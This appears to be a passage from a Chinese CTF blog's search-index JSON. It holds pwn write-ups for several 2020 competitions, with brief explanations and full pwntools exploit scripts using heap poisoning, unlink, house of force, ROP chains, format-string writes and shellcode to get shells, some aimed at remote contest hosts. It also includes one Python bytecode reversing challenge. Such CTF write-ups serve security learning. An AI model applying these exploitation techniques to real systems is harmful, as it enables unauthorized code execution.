show(idx):\n\tp.sendlineafter('>> ','3')\n\tp.sendlineafter('?',str(idx))\n\ndef change(idx,payload):\n\tp.sendlineafter('>> ','4')\n\tp.sendlineafter('?',str(idx))\n\tp.sendafter('?',payload)\nwhile(1):\n\t#p = process('./maj0rone')\n\tp = remote('123.56.52.128','18523')\n\tadd(0x90,'aaaa') #0\n\tadd(0x10,'aaaa') #1\n\tdelete(0)\n\tadd(0x20,'aaaa') #2\n\tadd(0x60,'aaaa') #3\n\tadd(0x60,'bbbb') #4\n\tdelete(3)\n\tpayload = 'a'*0x20+p64(0)+p64(0x91)\n\tchange(0,payload)\n\tdelete(4)\n\tdelete(3)\n\tchange(3,'\\xdd'+'\\x15')\n\tpayload = 'a'*0x20+p64(0)+p64(0x71)\n\tchange(0,payload)\n\ttry:\n\t\tadd(0x60,'aaaa')\n\t\tadd(0x60,'aaaa')\n\t\tadd(0x60,'aaaa') #7\n\texcept EOFError:\n\t\tprint 'error!!!'\n\t\tp.close()\n\t\tcontinue\n\tchange(7,'\\x00'*0x33 +p64(0xfbad1800)+p64(0)*3+p8(0))\n\tlibc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-0x3c5600\n\tmalloc_hook = libc_base+libc.sym['__malloc_hook']\n\tone = [0x45226,0x4527a,0xf0364,0xf1207]\n\tone_gadget = libc_base+one[3]\n\tinfo(hex(one_gadget))\n\tinfo(hex(libc_base))\n\tadd(0x60,'aaaa') #8\n\tdelete(8)\n\tchange(8,p64(malloc_hook-0x23))\n\tadd(0x60,'aaaa') #9\n\tadd(0x60,'aaaa') #10\n\tpayload = '\\x00'*0x13+p64(one_gadget)\n\tchange(10,payload)\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('n',str(80))\n\tp.sendline(str(0x10))\n\t# gdb.attach(p)\n\t# pause()\n\tp.interactive()\n```\n\n\n\n# 0x06 上海赛 cpu_emulator\n\n做vmpwn真的难，需要一定的逆向基础\n\n![image-20201129233652763](https://i.loli.net/2020/11/29/9wXqSIW2m1DHgsv.png)\n\n分析出主要逻辑，模拟了cpu的工作，32个寄存器，每个寄存器32位，指令长度也是32位，指令是分段的，且有两种解析方式，漏洞在第一种解析方式\n\n![image-20201129234316625](https://i.loli.net/2020/11/29/ahn1dIQR8m7SbxO.png)\n\n找到溢出点之后，就可以利用tcache改fd指针，将free_got和atoi_got 改成printf函数，构造格式化字符串漏洞来泄露libc基址，然后再改atoi_got为system即可\n\n## exp\n\n```python\nfrom pwn import*\n# context.log_level = 'debug'\np = process('./emulator')\nelf = ELF('./emulator')\nlibc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nogg = [0x4f365,0x4f3c2,0x10a45c]\nfree_got = elf.got['free'] #0x602018\natoi_got = elf.got['atoi'] #0x602058\nprintf_plt = elf.plt['printf']\nexit_got = elf.got['exit'] #0x602060\n\ndef show(a,addr):\n\tinfo(a+':'+hex(addr))\n\ndef setInstruction(size,content):\n\tp.sendlineafter('>> ','1')\n\tp.sendlineafter('size:\\n',str(size))\n\tp.sendafter('instruction:\\n',content)\n\ndef last_set(size,content):\n\tp.sendafter('>> ','1')\n\tp.sendlineafter('size:\\n','%'+str(size)+'c')\n\tp.sendafter('instruction:\\n',content)\n\ndef getOrder1(a1,a2,a3,a4):\n\tresult = (a1<<26) + (a2<<21) + (a3<<16) + a4 \n\treturn p32(result)\n\ndef run():\n\tp.sendlineafter('>> ','2')\n\nsetInstruction(0x100,'\\x00')\nsetInstruction(0x20,'\\x00')\nsetInstruction(0x30,'\\x00')\nsetInstruction(0x40,'\\x00')\npayload1 = getOrder1(8,0,0,0xf1) + getOrder1(8,0,0,0xe0) + getOrder1(8,1,1,0x8+1) + getOrder1(0x2b,1,0,0xffff)+getOrder1(1,0,0,0)\nsetInstruction(0x100,payload1)\nrun()\npayload2 = '\\x00'*0x100\npayload2 += p64(0)+p64(0xa1)+p64(free_got-8).ljust(0x20,'\\x00') #低8位因为fd会被清0\npayload2 += p64(0)+p64(0xb1)+p64(atoi_got).ljust(0x30,'\\x00')\npayload2 += p64(0)+p64(0xc1)+p64(atoi_got).ljust(0x40,'\\x00')\nsetInstruction(0x1c0,payload2)\n# run()\nsetInstruction(0x20,'\\x00')\nsetInstruction(0x30,'\\x00')\nsetInstruction(0x40,'\\x00')\nsetInstruction(0x20,p64(printf_plt)*2)\nsetInstruction(0x30,p64(printf_plt))\np.sendlineafter('>> ','%15$p')\nleak = int(p.recvuntil('\\n'),16) - 231\nlibcbase = leak - libc.sym['__libc_start_main']\none = libcbase + ogg[2]\nsystem_addr = libcbase + libc.sym['system']\nshow('libcbase',libcbase)\nshow('one_gadget',one)\nshow('system_addr',system_addr)\n\n# last_set(0x40,p64(system_addr))\nlast_set(0x40,p64(one))\n# p.sendlineafter('>> ','/bin/sh')\n\np.interactive() \n```\n\n\n\n# 0x07 cumt新生赛 pwn5\n\nchange函数存在溢出，没有开PIE，留了后门，写两种解法\n\n## exp\n\n解法一，可以用house of force来修改Bye函数指针为backdo0r\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n# r = remote('219.219.61.234','10014')\nr = process('./pwn5')\ndef add(size,con):\n\tp.sendlineafter('Your choice:','2')\n\tp.sendlineafter('Plz input the size of item name:',str(size))\n\tp.sendafter('Plz input the name:',con)\ndef delete(idx):\n\tp.sendlineafter('Your choice:','4')\n\tp.sendlineafter('Plz enter the index of item:',str(idx))\ndef show():\n\tp.sendlineafter('Your choice:','1')\ndef change(idx,size,con):\n    p.sendlineafter('Your choice:','3')\n    p.sendlineafter('Plz enter the index of item:',str(idx))\n    p.sendlineafter('Plz enter the length of item name:',str(size))\n    p.sendafter('Plz enter the new name of the item:',con)\n\nsys = 0x400D1B\nadd(0x30, \"ld1ng\")\npayload = 0x30 * 'a'\npayload += p64(0) + p64(0xffffffffffffffff)\nchange(0, 0x50, payload)\noffset = -0x60\nmalloc_size = offset -0x10\nadd(malloc_size, \"ld1ng\")\n# gdb.attach(r)\nadd(0x10, p64(sys) * 2)\nr.recvuntil(\":\")\nr.sendline(\"5\")\nr.interactive()\n```\n\n解法二，unlink改 free的got表\n\n```python\n#!/usr/bin/python\n#coding=utf-8\nfrom pwn import *\n#context.log_level = 'debug'\np = process('./pwn5')\n#p = remote('219.219.61.234','10014')\nelf = ELF('./pwn5')\n\nlibc = elf.libc\ndef add(size,con):\n\tp.sendlineafter('Your choice:','2')\n\tp.sendlineafter('Plz input the size of item name:',str(size))\n\tp.sendafter('Plz input the name:',con)\n\ndef delete(idx):\n\tp.sendlineafter('Your choice:','4')\n\tp.sendlineafter('Plz enter the index of item:',str(idx))\n\ndef show():\n\tp.sendlineafter('Your choice:','1')\n\ndef change(idx,size,con):\n    p.sendlineafter('Your choice:','3')\n    p.sendlineafter('Plz enter the index of item:',str(idx))\n    p.sendlineafter('Plz enter the length of item name:',str(size))\n    p.sendafter('Plz enter the new name of the item:',con)\nbuf = 0x06020b8\nsys = 0x400D1B\nadd(0x60,'ccc')\nadd(0x58,'aaa')\nadd(0x80,'bbb')\nadd(0x60,'eee')\nadd(0x60,'fff')\npayload = p64(0)+p64(0x51)\npayload += p64(buf - 0x18) \npayload += p64(buf - 0x10)\npayload += 'a'*0x30\npayload += p64(0x50)+p8(0x90) \nchange(1,0x80,payload)\ndelete(2)\nchange(1,0x40,p64(0x60)*3+ p64(0x6020a8))\nchange(1,0x40,p64(elf.got['free']))\nchange(0,0x40,p64(sys)*2)\n# delete(3)\n# gdb.attach(p)\np.interactive()\n```\n\n# 0x08 记事本逆向\n\n![image-20201128225011389](https://i.loli.net/2020/11/28/dIxOgr3muflb8TA.png)\n\n有一说一炜哥写文案的水平太强了\n\n```python\nDisassembly of __init__:\n 47           0 LOAD_CONST               0 (None)\n              2 LOAD_FAST                0 (self)\n              4 STORE_ATTR               0 (left)\n\n 48           6 LOAD_CONST               0 (None)\n              8 LOAD_FAST                0 (self)\n             10 STORE_ATTR               1 (right)\n\n 49          12 LOAD_FAST                1 (data)\n             14 LOAD_FAST                0 (self)\n             16 STORE_ATTR               2 (data)\n             18 LOAD_CONST               0 (None)\n             20 RETURN_VALUE\n\nDisassembly of inorderTraversal:  //左中右\n 59           0 BUILD_LIST               0\n              2 STORE_FAST               2 (res)\n\n 60           4 LOAD_FAST                1 (root)\n              6 POP_JUMP_IF_FALSE       48\n\n 61           8 LOAD_FAST                0 (self)   //res = self.inorderTraversal(root.left)\n             10 LOAD_ATTR                0 (inorderTraversal)\n             12 LOAD_FAST                1 (root)\n             14 LOAD_ATTR                1 (left)\n             16 CALL_FUNCTION            1\n             18 STORE_FAST               2 (res)\n\n 62          20 LOAD_FAST                2 (res)   //res.append(root.data)\n             22 LOAD_ATTR                2 (append)\n             24 LOAD_FAST                1 (root)\n             26 LOAD_ATTR                3 (data)\n             28 CALL_FUNCTION            1\n             30 POP_TOP\n\n 63          32 LOAD_FAST                2 (res)   //res += self.inorderTraversal(root.right)\n             34 LOAD_FAST                0 (self)\n             36 LOAD_ATTR                0 (inorderTraversal)\n             38 LOAD_FAST                1 (root)\n             40 LOAD_ATTR                4 (right)\n             42 CALL_FUNCTION            1\n             44 BINARY_ADD\n             46 STORE_FAST               2 (res)\n\n 64     >>   48 LOAD_FAST                2 (res)\n             50 RETURN_VALUE\n\nDisassembly of insert:  //左右左\n 51           0 LOAD_FAST                0 (self)\n              2 LOAD_ATTR                0 (data)\n              4 POP_JUMP_IF_FALSE       62\n\n 52           6 LOAD_FAST                0 (self) //if self.left is None\n              8 LOAD_ATTR                1 (left)\n             10 LOAD_CONST               0 (None)\n             12 COMPARE_OP               8 (is)\n             14 POP_JUMP_IF_FALSE       28\n\n 53          16 LOAD_GLOBAL              2 (Node)\n             18 LOAD_FAST                1 (data)\n             20 CALL_FUNCTION            1\n             22 LOAD_FAST                0 (self)\n             24 STORE_ATTR               1 (left) //self.left = Node(data)\n             26 JUMP_FORWARD            34 (to 62)\n\n 54     >>   28 LOAD_FAST                0 (self)\n             30 LOAD_ATTR                3 (right)\n             32 LOAD_CONST               0 (None)\n             34 COMPARE_OP               8 (is) \n             36 POP_JUMP_IF_FALSE       50\n\n 55          38 LOAD_GLOBAL              2 (Node) //self.right = Node(data)\n             40 LOAD_FAST                1 (data)\n             42 CALL_FUNCTION            1\n             44 LOAD_FAST                0 (self)\n             46 STORE_ATTR               3 (right)\n             48 JUMP_FORWARD            12 (to 62)\n\n 57     >>   50 LOAD_FAST                0 (self)  //self.left.insert(data)\n             52 LOAD_ATTR                1 (left)\n             54 LOAD_ATTR                4 (insert)\n             56 LOAD_FAST                1 (data)\n             58 CALL_FUNCTION            1\n             60 POP_TOP\n        >>   62 LOAD_CONST               0 (None)\n             64 RETURN_VALUE\n\nNone\n  2           0 LOAD_BUILD_CLASS\n              2 LOAD_CLOSURE             0 (Node)\n              4 BUILD_TUPLE              1\n              6 LOAD_CONST               1 (<code object Node at 0x0382DB20, line 2>)\n              8 LOAD_CONST               2 ('Node')\n             10 MAKE_FUNCTION            8\n             12 LOAD_CONST               2 ('Node')\n             14 CALL_FUNCTION            2\n             16 STORE_DEREF              0 (Node)\n\n 28          18 LOAD_GLOBAL              0 (input)\n             20 LOAD_CONST               3 ('PLZ input flag:')  //str1 = input('PLZ input flag:')\n             22 CALL_FUNCTION            1\n             24 STORE_FAST               0 (str1)\n\n 30          26 LOAD_CONST               4 (<code object <listcomp> at 0x0382DB78,  line 30>)\n             28 LOAD_CONST               5 ('main1.<locals>.<listcomp>')\n             30 MAKE_FUNCTION            0\n             32 LOAD_FAST                0 (str1)\n             34 GET_ITER\n             36 CALL_FUNCTION            1\n             38 STORE_FAST               1 (flag)\n\n 31          40 LOAD_DEREF               0 (Node)  //  root = Node(flag[0])\n             42 LOAD_FAST                1 (flag)\n             44 LOAD_CONST               6 (0)\n             46 BINARY_SUBSCR\n             48 CALL_FUNCTION            1\n             50 STORE_FAST               2 (root)\n\n 32          52 SETUP_LOOP              36 (to 90)\n             54 LOAD_GLOBAL              1 (range)  //for i in range(1,len(flag)):\n             56 LOAD_CONST               7 (1)\n             58 LOAD_GLOBAL              2 (len)\n             60 LOAD_FAST                1 (flag)\n             62 CALL_FUNCTION            1\n             64 CALL_FUNCTION            2\n             66 GET_ITER\n        >>   68 FOR_ITER                18 (to 88)\n             70 STORE_FAST               3 (i)\n\n 33          72 LOAD_FAST                2 (root)\n             74 LOAD_ATTR                3 (insert)  // root.insert(flag[i]) \n             76 LOAD_FAST                1 (flag)\n             78 LOAD_FAST                3 (i)\n             80 BINARY_SUBSCR\n             82 CALL_FUNCTION            1\n             84 POP_TOP\n             86 JUMP_ABSOLUTE           68\n        >>   88 POP_BLOCK\n\n 34     >>   90 LOAD_FAST                2 (root)\n             92 LOAD_ATTR                4 (inorderTraversal) // F = root.inorderTraversal(root)\n             94 LOAD_FAST                2 (root)\n             96 CALL_FUNCTION            1\n             98 STORE_FAST               4 (F)\n\n 35         100 LOAD_CONST               8 ('7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm')\n            102 STORE_FAST               1 (flag)  //flag = '7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm'\n\n 36         104 LOAD_CONST               7 (1)\n            106 STORE_FAST               5 (YES)\n\n 37         108 SETUP_LOOP              50 (to 160)\n            110 LOAD_GLOBAL              5 (enumerate) //迭代器，进行比较\n            112 LOAD_FAST                4 (F)\n            114 CALL_FUNCTION            1\n            116 GET_ITER\n        >>  118 FOR_ITER                38 (to 158)\n            120 UNPACK_SEQUENCE          2\n            122 STORE_FAST               3 (i)\n            124 STORE_FAST               6 (element)\n\n 38         126 LOAD_GLOBAL              6 (ord)\n            128 LOAD_FAST                1 (flag)\n            130 LOAD_FAST                3 (i)\n            132 BINARY_SUBSCR\n            134 CALL_FUNCTION            1\n            136 LOAD_FAST                6 (element)\n            138 COMPARE_OP               3 (!=)\n            140 POP_JUMP_IF_FALSE      118\n\n 39         142 LOAD_CONST               6 (0)\n            144 STORE_FAST               5 (YES)\n\n 40         146 LOAD_GLOBAL              7 (print)\n            148 LOAD_CONST               9 ('wrong')\n            150 CALL_FUNCTION            1\n            152 POP_TOP\n\n 41         154 BREAK_LOOP\n            156 JUMP_ABSOLUTE          118\n        >>  158 POP_BLOCK\n\n 42     >>  160 LOAD_FAST                5 (YES)\n            162 POP_JUMP_IF_FALSE      172\n\n 43         164 LOAD_GLOBAL              7 (print)\n            166 LOAD_CONST              10 ('wow~you are right!')\n            168 CALL_FUNCTION            1\n            170 POP_TOP\n        >>  172 LOAD_CONST               0 (None)\n            174 RETURN_VALUE\nNone\n```\n\npython字节码，做了点注释，\n\n分析出是一颗参天大树，主要在于读懂插入和中序遍历的逻辑，\n\n想了好久，实在想不出脚本怎么写，太菜了还是手撕吧\n\n贴上炜哥的源码\n\n```python\ndef main1():\n\tclass Node:\n\t\tdef __init__(self, data):\n\t\t\tself.left = None #左节点\n\t\t\tself.right = None #右节点\n\t\t\tself.data = data #值\n\t\tdef PrintTree(self):\n\t\t\tif self.left:\n\t\t\t\tself.left.PrintTree()\n\t\t\tprint(chr(self.data),end=\"\")\n\t\t\tif self.right:\n\t\t\t\tself.right.PrintTree()\n\t\tdef insert(self,data):\n\t\t\tif self.data:\n\t\t\t\tif self.left is None:\n\t\t\t\t\tself.left = Node(data)\n\t\t\t\telif self.right is None:\n\t\t\t\t\tself.right = Node(data)\n\t\t\t\telse:\n\t\t\t\t\tself.left.insert(data)\n\t\tdef inorderTraversal(self, root):\n\t\t\tres = []\n\t\t\tif root:\n\t\t\t\tres = self.inorderTraversal(root.left)\n\t\t\t\tres.append(root.data)\n\t\t\t\tres = res + self.inorderTraversal(root.right)\n\t\t\treturn res\n\tstr1=input(\"PLZ input flag:\")\n\t#str1=\"cumtctf{1e70a305fb378202c26dd6dafa14db17}\"\n\tflag=[ord(i) for i in str1]\n\troot = Node(flag[0])\n\tfor i in range(1,len(flag)):\n\t\troot.insert(flag[i])\n\tF=root.inorderTraversal(root)\n\tflag=\"7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm\"\n\tYES=1\n\tfor i, element in enumerate(F):\n\t\tif ord(flag[i])!=element:\n\t\t\tYES=0\n\t\t\tprint(\"wrong\")\n\t\t\tbreak\n\tif YES:\n\t\tprint(\"wow~you are right!\")\n```\n\n\n\n# 0x09 小结\n\n十一月总结：太菜了","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Oct_Match 2020","url":"/2020/10/25/Oct_Match/","content":"\n# 0x00 前言\n\n十月先是说走就走去了南京，打了天创杯，题目质量一言难尽\n\n回来两天又被叫去南通参加工业互联网比赛，和[iluem](https://iluem.xyz/)和[iyzyi](http://iyzyi.com/)师傅一起得了一等奖\n\n当天晚上八点打华为杯，成绩不错破了两万分\n\n堆了好多作业没写，也没什么时间复现题目，贴下校赛wp水一篇博客\n\n# 0x01 西湖论剑2020 mmutag\n\n一道堆栈结合的题目， introduce函数存在栈溢出，可以先泄露canary，然后伪造fakechunk，double free将堆劫持到栈上，利用ROP泄露出libc基址，泄露出libc后就可以为所欲为了，有多种思路\n\n这是此时的栈结构\n\n![image-20201014104706034](https://i.loli.net/2020/10/14/qFdcubhy6HrtQ1f.png)\n\n## exp\n\n1.利用ret2csu(或者构造rop)，调用read函数，利用ropgetshell\n\n```python\n# encoding=utf-8\nfrom pwn import *\nelf = ELF('./mmutag')\np = elf.process()\n# p = remote('183.129.189.62', 58704)\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\none_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]\n\ndef read_introduce1(introduce):\n    p.sendlineafter(\"input your choice:\\n\\n\", \"1\")\n    p.sendafter(\"your introduce \\n\", introduce)\n\ndef introduce():\n    p.sendlineafter(\"input your choice:\\n\\n\", \"2\")\n\ndef add(index, content):\n    p.sendlineafter(\"your choise:\\n\", \"1\")\n    p.sendlineafter(\"your id:\\n\", str(index))\n    p.sendafter(\"your content\\n\", content)\n\ndef delete(index):\n    p.sendlineafter(\"your choise:\\n\", \"2\")\n    p.sendlineafter(\"your id:\\n\", str(index))\n\ndef stack_leak(content):\n    p.sendlineafter(\"your choise:\\n\", \"3\")\n    p.send(content)\n\npoprdi = 0x0000000000400d23\n\np.recvuntil(\"input you name: \\n\")\np.sendline(\"ld1ng\")\np.recvuntil(\"your tag: \")\nstack_address = int(p.recvuntil(\":\", drop=True), 16)\nlog.success(\"stack address {}\".format(hex(stack_address)))\n#read_introduce1(p64(0x71))\nintroduce()\nstack_leak(\"1\"*0x19)\np.recvuntil(\"Your content: \")\np.recvuntil(\"1\"*0x18)\ncanary = u64(p.recv(8)) - ord(\"1\")# leak canary\nlog.success(\"canary {}\".format(hex(canary)))\nstack_leak(p64(0) + p64(0x71) + p64(0)+'\\x00')#build fake chunk , end of canary->00\nadd(1,'ld1ng')\nadd(2,'ld1ng')\ndelete(1)\ndelete(2)\ndelete(1) # double free\nadd(3, p64(stack_address - 0x40))# fd->fake chunk\nadd(5,'ld1ng')\nadd(6,'ld1ng')\n#gdb.attach(p)\npayload = b\"a\"*0x8 + p64(canary)\npayload += p64(stack_address + 0x10)\npayload += p64(poprdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])\npayload += p64(0x400D1C)#__libc_csu_init\npayload += p64(elf.got['read']) + p64(0x80) + p64(stack_address+0x28) + p64(0)\npayload += p64(0x400d00) #ret2csu\nadd(7, payload)\n#gdb.attach(p)\np.sendlineafter(\"your choise:\\n\", \"4\")# trigger bug\n\nlibc.address = u64(p.recvline().strip(b\"\\n\").ljust(8, b\"\\x00\")) - libc.sym['puts']\nlog.success(\"libc address {}\".format(hex(libc.address)))\n# str_sh = libc.search(b\"/bin/sh\\x00\").next()\n# log.success(\"str_bin/sh {}\".format(hex(str_sh)))\n# payload = p64(poprdi) + p64(str_sh)\n# payload += p64(libc.sym['system'])\nonegadget = libc.address + one_gadget[1]\nlog.success(\"one:\" + hex(onegadget))\npayload = p64(onegadget)\np.send(payload)\n# pause()\np.interactive()\n\n```\n\n2.老方法，利用malloc_hook和realloc_hook\n\n```python\nlibc_base = u64(p.recv(6).ljust(8,'\\x00')) - 240 - libc.sym['__libc_start_main']\nlog.info(\"LIBC:\\t\"+ hex(libc_base))\nfree(2)\nfree(1)\nfree(2)\nrce = libc_base + 0x4527A\nrealloc = libc_base + libc.sym['realloc']\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nnew(7,p64(malloc_hook - 0x23))\nnew(8,\"UUUU\")\nnew(9,'UUUU')\nnew(10,'\\x00'*(0x13 - 8) + p64(rce) + p64(realloc + 4))\nfree(1)\nfree(1)\np.interactive()\n```\n\n3.两次double free 两次rop\n\n```python\n#leak libc_base\nputs_addr=u64(sh.recvuntil(\"\\x7f\")[-6:].ljust(8,\"\\x00\"))\nlibc_base=puts_addr-libc.symbols[\"puts\"]\nsystem_addr=libc_base+libc.symbols[\"system\"]\nbinsh=libc_base+libc.search(\"/bin/sh\").next()\ninfo(\"libc_base:0x%x\",libc_base)\n\n#try again\nsh.recvuntil(\"please input your choise:\")\nsh.sendline(\"3\")\npayload=p64(0)+p64(0x71)\nsh.sendline(payload)\ndelete(1)\ndelete(2)\ndelete(1)\npayload=p64(stack_addr-0x20)\nadd(7,payload)\nadd(8,'cccc')\nadd(9,'dddd')\npayload=\"a\"*8+p64(canary)\npayload+=\"b\"*8+p64(poprdi)+p64(binsh)\npayload+=p64(system_addr)+p64(main)\nadd(10,payload)\nsh.recvuntil(\"please input your choise:\")\nsh.sendline(\"4\")\nsh.interactive()\n```\n\n4.利用read覆盖atoi@GOT\n\n因此ROP链为： \n\nputs(puts@GOT)泄露libc地址 \n\nread(0, atoi@GOT, ...)劫持GOT \n\n返回到ReadInt触发system\n\n```python\nexp = p64(0) #fd\nexp+= p64(canary)\nexp+= p64(buf)\nexp+= p64(elf.got['puts'])\nexp+= p64(elf.plt['puts']) #puts(puts@GOT)\nexp+= p64(0x400d23) #pop rdi ; ret\nexp+= p64(0) #STDIN\nexp+= p64(0x400d21) #pop rsi ; pop r15 ; ret\nexp+= p64(elf.got['atoi'])\nexp+= p64(0)\nexp+= p64(elf.plt['read']) #read(STDIN, atoi@GOT, ...)\nexp+= p64(0x400942) # Read option\nAdd(6, exp)\nLeave() #trigger\nputs_addr = u64(sh.recv(6).ljust(8, '\\x00'))\nlibc.address = puts_addr - libc.symbols['puts']\nlog.success('libc base = '+hex(libc.address))\nsh.send(p64(libc.symbols['system'])) #atoi@GOT = system@LIBC\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n...你学废了吗\n\n\n\n# 0x02 N1CTF2020 Signin\n\nc++完全读不懂，全靠动调分析程序，用的vector\n\nbss段储存内存块 1 2 信息的3个指针\n\n指针1和3是一个边界指针，指针2是数据编辑指针。根据指针2处来写number数据。\n\n当指针2大小超过指针3，其就会申请一块新的内存，其申请完内存大小是以`0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010` 这样递增。\n\n申请完新内存，会把上一块chunk free，并把上一块内存中的number值进行拷贝到新申请的内存中。并且会根据申请到的chunk地址，进行对bss段3个指针的更新\n\n## exp\n\n思路add多次绕过tcache，通过unsortedbin泄露libc基址\n\n最后接着free，让指针2指向0x20的fd处，修改其为free hook ，并改为system，再次free触发漏洞\n\n```python\nfrom pwn import *\ns = process(\"./signin\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\ndef add(idx,num):\n\ts.sendlineafter(\">>\",\"1\")\n\ts.sendlineafter(\"Index:\",str(idx))\n\ts.sendlineafter(\"Number:\",str(num))\ndef free(idx):\n\ts.sendlineafter(\">>\",\"2\")\n\ts.sendlineafter(\"Index:\",str(idx))\ndef show(idx):\n\ts.sendlineafter(\">>\",\"3\")\n\ts.sendlineafter(\"Index:\",str(idx))\nfor i in range(0x101):\n\tadd(1,1)\nfor i in range(0x202):\n\tfree(1)\nshow(1)\nlibc_base = int(s.recv(15),10)- 0x70 - libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nfree_hook = libc.sym['__free_hook'] + libc_base\nsystem = libc_base + libc.sym['system']\ninfo(hex(system))\nfor i in range(0x10d):\n\tfree(1)\nshow(1)\nadd(1,free_hook-0x8)\nadd(2,u64(\"/bin/sh\\x00\"))\nadd(2,system)\ns.interactive()\n```\n\n# 0x03 CUMTCTF \n\n我习惯每次都用ubuntu16.4在本地做，比赛libc是2.27，往往需要大改，校赛题目改exp比写的时间还长！￣へ￣\n\n## 0x00 login\n\n远程连接超时，可能是system没对齐的原因，当时没考虑太多直接采用蠢比写法。。\n\n```python\nfrom pwn import *\nelf = ELF('./login')\n#p = elf.process()\n#context.log_level = 'debug'\np = remote('219.219.61.234', 10000)\nsys = 0x4006F0\nbssaddr = elf.bss()\np.recvuntil(\"choice:\")\np.sendline('1')\np.recvuntil(\"username\")\np.sendline('cat flag')\np.recvuntil(\"password\")\npayload = 'a'*0x40 + 'b'*0x8 + p64(0x400be3) + p64(0) + p64(0x400be1) + p64(bssaddr) + p64(0) + p64(elf.sym['read']) + p64(0x400A36)\np.sendline(payload)\np.sendline('cat flag')\np.recvuntil(\"username(length less than 20):\")\np.sendline('123456')\np.recvuntil(\"password(length less than 20):\")\npayload = 'a'*0x40 + 'b'*0x8  + p64(0x400be3) + p64(bssaddr) + p64(sys) + p64(0x0400AF9)\np.sendline(payload)\n#pause()\np.interactive()\n\n```\n\n## 0x01 login_plus\n\nlonglong型(64位)和int型(32位)，整数溢出\n\n```python\nfrom pwn import *\nelf = ELF('./login')\n#p = elf.process()\n#context.log_level = 'debug'\np = remote('219.219.61.234', 10001)\nsys = 0x4006F0\nbssaddr = elf.bss()\np.recvuntil(\"choice:\")\np.sendline('1')\np.recvuntil('Enter your id!')\npayload = pow(2,32)\nprint payload\np.sendline('4294967296')\n# p.recvuntil('Enter your id!')\n# p.sendline('0')\n# p.recvuntil(\"username(length less than 20)\")\n# p.send('test')\n# p.recvuntil(\"password(length less than 20)\")\n# gdb.attach(p)\n# p.send('a'*0x18 + p64(0x6011D0))\n# p.send('test')\n\np.interactive()\n```\n\n## 0x02 not_implemented_login_service\n\nbss段写shellcode，ret2bss\n\nROP的方法打不通不明原因...\n\n```python\nfrom pwn import *\nelf = ELF('./login''')\n#p = elf.process()\np = remote('219.219.61.234',10004)\n#context.log_level = 'debug'\ncontext(arch = 'amd64',os = 'linux')\n#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc = ELF('libc-2.27.so')\nshellcode = asm(shellcraft.sh())\naddr = 0x601060\np.recvuntil(\"username:\")\np.sendline(shellcode)\npayload='pwnht'.ljust(0x10,'\\x00') + 'b'*8 + p64(addr)\n#p.recvuntil('password:')\np.sendline(payload)\np.interactive()\n```\n\n## 0x03 note_service\n\n泄露libc基址，栈地址和返回地址，格式化字符串任意地址写\n\n```python\nfrom pwn import *\nelf = ELF('./note_service')\ncontext(arch='amd64',os='linux')\n#p = elf.process()\ncontext.log_level = 'debug'\np = remote('219.219.61.234', 10002)\nlibc = ELF('libc-2.27.so')\nonegadget = [0x4f2c5, 0x4f322,0x10a38c,0xf1207]\ndef leak(con):\n    p.recvuntil('input your note:')\n    p.sendline(str(con))\n    p.recvuntil(\"is:\")\n    mm = int(p.recvuntil(\"-\").strip('-'),16)\n    p.recvuntil('????')\n    p.sendline('123')\n    return mm\np.recvuntil('input your name:')\np.sendline('ld1ng')\nstack = leak(\"%38$p-\") - 0xd8\ninfo(\"libc + 240:\" + hex(stack))\ncanary = leak('%39$p-')\ninfo(\"canary:\" + hex(canary))\nlibc_base = leak('%41$p-') - 231 -libc.sym['__libc_start_main']\ninfo(\"libc_base:\" + hex(libc_base))\none_gadget = libc_base + onegadget[0]\npayload = fmtstr_payload(6,{stack:one_gadget})\np.recvuntil('note:')\np.sendline(payload)\np.recv()\np.recvuntil('????')\np.sendline('yes')\n#gdb.attach(p)\np.interactive()\n\n```\n\n## 0x04 messagesystem\n\ntcache + unlink，改写free_got为system\n\n哇ubuntu16.4做出来之后才得知是libc2.27，改了好久\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\n#sh=process(\"./messagesystem\")\ncontext(arch='amd64',os='linux')\nsh = remote('219.219.61.234', 10003)\nlibc=ELF(\"libc-2.27.so\")\n#libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#og = [0x4f2c5,0x4f322,0x10a38c]\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('Now Leave Message!')\n    sh.sendline(str(idx))\n    sh.recvuntil(\"want to leave?\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"want to say?\")\n    sh.send(content)\n\ndef edit(idx,content):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(4))\n\tsh.recvuntil(\"want to edit?\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"enter your Message!\")\n\tsh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"want to show?\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice: \")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"want to 